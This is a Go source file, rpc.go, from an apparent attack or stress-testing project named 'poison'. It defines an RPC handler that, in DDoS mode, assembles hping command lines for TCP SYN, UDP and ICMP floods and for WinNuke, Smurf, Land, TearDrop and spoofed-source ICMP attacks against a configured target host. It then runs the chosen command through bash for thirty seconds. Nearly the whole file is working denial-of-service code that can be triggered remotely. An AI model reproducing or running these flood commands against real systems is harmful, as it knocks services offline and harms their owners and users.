// Package rpc -----------------------------
// @file      : rpc.go
// @author    : fzf
// @contact   : fzf54122@163.com
// @time      : 2023/12/8 下午2:02
// -------------------------------------------
package rpc

import (
	"fmt"
	logger "github.com/sirupsen/logrus"
	"os"
	"os/exec"
	"poison/src/common"
	"poison/src/model"
	"poison/src/utils"
	"time"
)

type RPC struct {
	config *model.Stream
}

func (r *RPC) method() error {
	logger.Infoln(r.config)
	switch r.config.APPMode {
	case model.SEND:
		if err := utils.Client.Execute(r.config); err != nil {
			return err
		}
	case model.DDOS:
		hping := common.Generate()
		commands := map[string]string{
			"TCP":      fmt.Sprintf("%s  -c 1000 -d 120 -S -p 10086 --flood %s", hping, r.config.DstHost),
			"UDP":      fmt.Sprintf("%s  %s -c 1000 --flood -2 -p 10086", hping, r.config.DstHost),
			"ICMP":     fmt.Sprintf("%s  %s -c 1000 --flood -1", hping, r.config.DstHost),
			"WinNuke":  fmt.Sprintf("%s  -d 120 -U %s -p 139", hping, r.config.DstHost),
			"Smurf":    fmt.Sprintf("%s  -1 %s --flood", hping, r.config.DstHost),
			"Land":     fmt.Sprintf("%s  -d 120 -S -a %s -p 10086 %s", hping, r.config.DstHost, r.config.DstHost),
			"TearDrop": fmt.Sprintf("%s  %s -2 -d 5000 --fragoff 1200 --frag --mtu 1000", hping, r.config.DstHost),
			"MAXICMP":  fmt.Sprintf("%s  %s -c 10000 -d 5000 --flood -1 --rand-source", hping, r.config.DstHost),
		}
		cmd := exec.Command("bash", "-c", commands[r.config.Mode])
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		// 启动协程执行命令
		go func() {
			cmd.Run()
		}()
		// 等待30秒
		waitTime := 30 * time.Second
		fmt.Printf("等待 %s 后关闭命令...\n", waitTime)
		time.Sleep(waitTime)
		// 关闭命令
		if err := cmd.Process.Kill(); err != nil {
			fmt.Println("命令关闭失败:", err)
		}
		fmt.Println("命令已关闭.")
	}
	return nil
}
func (r *RPC) Start(config *model.Stream, result *error) error {
	r.config = config
	logger.Println(r.config)
	if err := r.method(); err != nil {
		*result = err
		return err
	}
	return nil
}
